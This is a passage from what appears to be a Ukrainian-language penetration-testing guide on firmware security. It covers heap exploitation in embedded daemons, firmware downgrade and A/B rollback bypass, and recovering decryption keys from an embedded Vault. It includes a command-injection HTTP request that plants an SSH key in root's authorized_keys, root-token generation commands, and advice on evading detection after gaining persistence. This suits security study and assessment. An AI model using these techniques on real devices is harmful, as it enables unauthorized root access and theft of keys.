- Підроблений розмір поточного пакета, який проходить нові перевірки, але все одно спричиняє переповнення початково виділеного буфера.

Якщо вразливий шлях захищений логікою commissioning, експлуатація має включати достатню **емуляцію пристрою**, щоб перевести ціль у потрібний стан завантаження model або blob перед надсиланням некоректних фрагментів.

### Тригери `free()`, що керуються протоколом

В embedded daemon найпростіше спричинити експлуатацію метаданих heap не через «очікування очищення», а через **примусове виконання власної обробки помилок протоколу**:<sup>[[8]](#references)</sup>

- Надсилайте некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Скористайтеся цим передбачуваним викликом `free()`, щоб запустити примітиви на боці allocator до того, як процес аварійно завершиться з інших причин.

Це особливо корисно проти allocator на кшталт **musl/uClibc/dlmalloc** в embedded Linux, де пошкодження метаданих chunk може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле size**, щоб спрямувати обхід allocator на **фальшиві chunks, розміщені всередині переповненого буфера**, замість того щоб одразу пошкодити справжні вказівники bin і спричинити аварійне завершення процесу.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування мовами нижчого рівня. Захисти runtime бінарних файлів в embedded-системах трапляються рідко, але за їх наявності можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins + консолідація:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може запустити `__malloc_consolidate()`, тож будь-який фальшивий chunk має проходити перевірки (коректний size, `fd = 0`, а навколишні chunks мають сприйматися як ті, що «використовуються»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE під ASLR:** якщо ASLR увімкнено, але основний бінарний файл **не використовує PIE**, адреси `.data/.bss` усередині бінарного файлу стабільні. Можна націлитися на область, яка вже схожа на коректний заголовок heap chunk, щоб спрямувати виділення fastbin на **таблицю вказівників на функції**.
- **NUL, що зупиняє парсер:** під час парсингу JSON символ `\x00` у payload може зупинити парсинг, зберігши наступні контрольовані атакувальником байти для pivot стека/ланцюжка ROP.
- **Shellcode через `/proc/self/mem`:** ланцюжок ROP, що викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому mapping і передати йому керування.

## Атаки зі downgrade firmware та ненадійні механізми оновлення

Навіть коли виробник реалізує криптографічну перевірку підпису образів firmware, **захист від повернення до попередньої версії (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за вбудованим відкритим ключем, але не порівнює *версію* (або монотонний лічильник) образу, який прошивається, атакувальник може легітимно встановити **старішу вразливу firmware з дійсним підписом** і таким чином знову зробити доступними виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий перебіг атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його з супутніх мобільних/настільних застосунків (наприклад, з `assets/firmware/` усередині Android APK).
   * Отримайте його зі сторонніх репозиторіїв, як-от VirusTotal, інтернет-архівів, форумів тощо.
2. **Завантажте образ на пристрій або надайте його пристрою** через доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* HTTP(S)-ендпоїнти, що приймають firmware blob у кодуванні Base64, декодують його на сервері та запускають recovery/оновлення.
3. Після downgrade експлуатуйте вразливість, яку виправили в новішому релізі (наприклад, фільтр для command injection, доданий пізніше).
4. За потреби знову прошийте найновіший образ або вимкніть оновлення, щоб уникнути виявлення після отримання persistence.

### Приклад: Command Injection після downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (версії зі зниженим рівнем) прошивці параметр `md5` напряму додається до команди shell без очищення, що дає змогу впроваджувати довільні команди (у цьому випадку — увімкнути доступ root за допомогою SSH-ключа). У пізніших версіях прошивки додали базовий фільтр символів, але відсутність захисту від downgrade зводить виправлення нанівець.<sup>[[4]](#references)</sup>

### Вилучення прошивки з мобільних застосунків

Багато виробників додають повні образи прошивки до своїх мобільних застосунків-компаньйонів, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакети зазвичай зберігаються незашифрованими в APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягнути підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід захисту від відкату, реалізованого лише в updater, у конструкціях зі слотами A/B

Деякі виробники реалізують **механізм захисту від відкату** (*ratchet*), але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді відновлення або OTA-агенті в userspace). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу й довіряє таблиці розділів або метаданим слотів, захист від відкату все одно можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Метадані прошивки містять і дескриптор версії, і **механізм захисту від відкату** (*security ratchet*) / монотонний лічильник.
- Updater порівнює значення лічильника образу зі значенням у постійному сховищі та відхиляє старіші підписані образи.
- Bootloader **не** обробляє цей лічильник і перед завантаженням вибраного слота перевіряє лише заголовок, CRC і підпис.
- Активація слота зберігається окремо — у таблиці розділів або в лічильнику поколінь для кожного слота — і **не прив’язана криптографічно** до точного хешу перевіреної прошивки.

У системах із двома слотами це створює примітив **«перевірити один образ / завантажити інший»**. Якщо зловмисник може змусити updater позначити слот B як наступну ціль завантаження за допомогою актуального підписаного образу, а потім перезаписати слот B до перезавантаження, bootloader може все одно завантажити старішу прошивку, оскільки довіряє лише вже зафіксованим метаданим слота.

Типова схема зловживання:

1. Завантажити **актуальну підписану** прошивку в пасивний слот і виконати звичайну процедуру перевірки/перемикання, щоб у розмітці цей слот став наступним активним.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії повторно викликати процедуру підготовки/стирання слота.
3. Скористатися застарілим станом завантаження або логікою вибору слота, щоб updater стер **той самий фізичний слот**, який щойно було призначено активним.
4. Записати в цей слот **старішу, але все ще підписану** прошивку.
5. Пропустити процедуру перевірки, яка застосовує механізм захисту від відкату, і перезавантажити пристрій напряму.
6. Bootloader вибирає призначений активним слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звертати увагу під час реверс-аналізу реалізацій оновлення A/B:

- Вибір слота залежить від **прапорців, зчитаних під час завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()` стирає слот на основі застарілого стану, а не **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()` лише збільшує **лічильник поколінь** / встановлює прапорець активного слота й не зберігає хеш перевіреного образу.
- Перевірки механізму захисту від відкату реалізовані в userspace або коді updater, але **не** в ROM / bootloader / етапах secure boot.
- Процедури стирання або відновлення залишають слот позначеним як завантажуваний, навіть після видалення та перезапису його вмісту.

### Контрольний список для оцінювання логіки оновлення

* Чи належно захищено транспорт/автентифікацію *кінцевої точки оновлення* (TLS + автентифікація)?
* Чи перевіряє пристрій **номери версій** або **монотонний лічильник захисту від відкату** перед записом прошивки?
* Чи перевіряється образ у ланцюжку secure boot (наприклад, чи перевіряє підписи код ROM)?
* Чи застосовує **bootloader той самий механізм захисту від відкату**, що й updater, замість перевірки лише підпису/CRC?
* Чи прив’язані метадані активації слота до **хешу/версії перевіреної прошивки**, чи слот можна змінити після призначення активним?
* Після успішного перемикання слота пристрій примусово перезавантажується чи в тій самій сесії й надалі доступні процедури оновлення/стирання?
* Чи виконує код userland додаткові перевірки коректності (наприклад, дозволеної карти розділів, номера моделі)?
* Чи використовують *часткові* або *резервні* процедури оновлення ту саму логіку перевірки?

> 💡 Якщо чогось із переліченого бракує, платформа, імовірно, вразлива до атак із відкатом.

## Відновлення ключів розшифрування прошивки зі стану вбудованого KMS/Vault

Якщо образ оновлення поєднує невеликі фрагменти метаданих у відкритому вигляді з великим високoентропійним блоком даних, перш ніж щось підбирати перебором, проаналізуйте структуру контейнера:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зміщення та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це сіль, решта — зашифровані дані.
- Поле Base64, яке після декодування має рівно `256` байтів, — сильна ознака того, що це RSA-2048-шифротекст, який містить випадковий пароль/сеансовий ключ прошивки.
- Відокремлені дані PGP у тому самому файлі часто захищають лише автентичність; не вважайте їх механізмом забезпечення конфіденційності.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) нічого не дав, проведіть зворотний аналіз **робочого шляху розшифрування**, а не лише шукайте закриті ключі:

- Декомпілюйте updater / бінарний файл керування та з’ясуйте, хто читає зашифрований блок даних, який допоміжний засіб/API його розшифровує та яке логічне ім’я ключа він запитує.
- Шукайте в розпакованій кореневій файловій системі стан KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також файли служб і скрипти ініціалізації.
- Розглядайте відкриті команди `vault operator unseal ...`, ключі відновлення, токени початкового налаштування або локальні скрипти автоматичного розпечатування KMS як еквівалент матеріалу закритого ключа.

Якщо в пристрої є оригінальний бінарний файл Vault і бекенд сховища, зазвичай простіше відтворити це середовище, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Маючи root-доступ до клонованого KMS:

- Зробіть transit keys експортованими лише в ізольованому клоні: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ unwrap: `vault read transit/export/encryption-key/<name>`
- Спробуйте використати відновлений RSA key з точною парою padding/hash, яку використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала розшифровка з OAEP за замовчуванням **не** доводять, що ключ неправильний: у багатьох потоках на основі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від виробника (`EVP_BytesToKey`, часто MD5 у застарілих пристроях), перш ніж намагатися розшифрувати AES-CBC.

Це перетворює проблему «зашифрованої прошивки» на ширше завдання: **відновити операційні ключі на стороні пристрою, а потім офлайн відтворити точні параметри unwrap + KDF**.
